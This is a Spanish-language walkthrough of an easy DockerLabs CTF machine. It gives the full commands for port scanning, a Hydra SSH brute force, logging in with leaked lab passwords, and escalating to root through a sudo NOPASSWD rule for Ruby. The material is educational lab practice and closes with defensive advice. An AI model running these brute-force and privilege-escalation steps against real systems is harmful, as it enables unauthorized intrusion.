# 🖥️ **Máquina: Vacaciones**  
- **🔹 Dificultad:** Muy Fácil  
- **📌 Descripción:**  
  Laboratorio enfocado en practicar técnicas de reconocimiento, ataque de fuerza bruta a SSH y escalada de privilegios. Ideal para principiantes en pentesting y CTFs.  

- **🎯 Objetivo:**  
  - Enumerar servicios expuestos.
  - Acceder mediante fuerza bruta SSH.
  - Cambio de usuario vía nueva sesión SSH.
  - Escalada de privilegios a `root`.

![Despliegue](/Vacaciones/Imagenes/Plantilla.png)

---

## 🐳 **Despliegue en DockerLabs**

### 1️⃣ Preparar el entorno

Descomprimir y desplegar:

```bash
7z e vacaciones.zip
sudo bash auto_deploy.sh vacaciones.tar
```

- **IP asignada**: `172.17.0.2`

📸 **Captura:**  
![Despliegue](/Vacaciones/Imagenes/Activo.jpeg)

---

## 🛰️ **Reconocimiento Inicial**

### 2️⃣ Comprobar conectividad

```bash
ping -c4 172.17.0.2
```

📸 **Captura:**  
![Ping](/Vacaciones/Imagenes/Ping.jpeg)

---

## 🌐 **Enumeración Web**

Accedemos al servidor web usando `curl`:

```bash
curl http://172.17.0.2
```

**¿Qué hace `curl` aquí?**  
- `curl` permite hacer **una petición HTTP manual** al servidor.
- En vez de usar un navegador, `curl` muestra **todo el contenido HTML crudo**.
- Esto ayuda a encontrar comentarios ocultos, cabeceras especiales o información sensible que no se muestra normalmente.

**Resultado obtenido**:
```html
<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
```

📸 **Captura:**  
![Página Web](/Vacaciones/Imagenes/Pagina.jpeg)

**Conclusión**:  
Hay **un mensaje oculto en el código fuente** indicando que Camilo recibió un correo importante.

---

## 🔍 **Escaneo de Puertos**

Escaneo rápido de todos los puertos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

**Resultados**:
- Puerto **22**: SSH
- Puerto **80**: HTTP

📸 **Captura:**  
![Puertos Abiertos](/Vacaciones/Imagenes/Puertos.jpeg)

---

### 3️⃣ Detección de Servicios

Escaneo detallado:

```bash
nmap -sC -sV -p 22,80 172.17.0.2 -oN target.txt
```

Servicios detectados:
- **SSH**: OpenSSH 7.6p1
- **HTTP**: Apache 2.4.29

📸 **Captura:**  
![Servicios Detectados](/Vacaciones/Imagenes/Servicios.jpeg)

---

# 📋 **Resumen de Servicios Detectados**

| Servicio | Puerto | Versión                        |
|:---------|:-------|:-------------------------------|
| SSH      | 22     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 |
| HTTP     | 80     | Apache 2.4.29 (Ubuntu)          |

---

## 🔓 **Ataque SSH con Fuerza Bruta**

### 4️⃣ Uso de Hydra

Realizamos un ataque de fuerza bruta al servicio SSH:

```bash
hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t20
```

📸 **Captura:**  
![Hydra](/Vacaciones/Imagenes/Hydra.jpeg)

✅ Resultado:
- **Usuario**: `camilo`
- **Contraseña**: `password1`

---

## 🧑‍💻 **Acceso SSH como Camilo**

Conexión SSH:

```bash
ssh camilo@172.17.0.2
```

📸 **Captura:**  
![Contraseña](/Vacaciones/Imagenes/Contraseña.jpeg)

✅ Acceso exitoso.

---

## 📜 **Exploración de archivos internos**

Dentro de la máquina:

```bash
cd /var/mail/camilo
cat correo.txt
```

**Contenido**:

```text
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. 
Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

✅ Encontramos **una nueva contraseña**.

---

## 🔑 **Nuevo login SSH como Juan**

**Cerrar sesión de Camilo** y **conectarse como Juan**:

```bash
ssh juan@172.17.0.2
```
Contraseña: `2k84dicb`

✅ Acceso correcto como **juan**.

---

## 🧗 **Escalada de Privilegios a Root**

Listamos los permisos `sudo`:

```bash
sudo -l
```

Resultado:

```
User juan may run the following commands on 2b9b77c590b9:
    (ALL) NOPASSWD: /usr/bin/ruby
```

✅ **Juan puede ejecutar `/usr/bin/ruby` como root sin contraseña**.

---

### 📈 **Escalada usando Ruby**

Como Juan puede usar Ruby como root, **escalamos privilegios** ejecutando:

```bash
sudo /usr/bin/ruby -e 'exec "/bin/bash"'
```

**Explicación del comando**:
- `sudo` → Ejecutamos como root.
- `/usr/bin/ruby` → Usamos Ruby, autorizado sin contraseña.
- `-e` → Ejecutamos el siguiente código Ruby:
- `'exec "/bin/bash"'` → Ruby reemplaza su proceso actual por una **shell bash como root**.

✅ Ahora tenemos **una consola root**.

---

# 🏁 **Máquina Completada**

| Usuario | Contraseña | Método de Acceso                 |
|:--------|:-----------|:---------------------------------|
| camilo  | password1  | Hydra + SSH                      |
| juan    | 2k84dicb   | Contraseña encontrada + SSH      |
| root    | N/A        | `sudo ruby` y ejecución de bash  |

---

# 🛠️ **Herramientas Utilizadas**

| Herramienta | Descripción | Uso |
|:------------|:------------|:----|
| **nmap**    | Escaneo de red | Identificar puertos y servicios abiertos |
| **hydra**   | Fuerza bruta | Obtener acceso SSH explotando contraseñas débiles |
| **ssh**     | Conexión segura | Acceso remoto a los usuarios |
| **sudo**    | Escalada de privilegios | Obtener permisos de superusuario |
| **curl**    | Peticiones HTTP | Extracción de mensajes ocultos en HTML |

---

# 📚 **Conclusiones**

Esta máquina refuerza conceptos básicos como:
- Enumeración de servicios.
- Ataques de fuerza bruta con `hydra`.
- Búsqueda de información en archivos del sistema.
- Accesos multiusuario vía SSH.
- Escalada de privilegios usando configuración insegura de `sudo`.

**Buenas prácticas recordadas**:
- No usar contraseñas débiles.
- No dejar información sensible expuesta en sistemas públicos.
- Limitar estrictamente el uso de `sudo`.
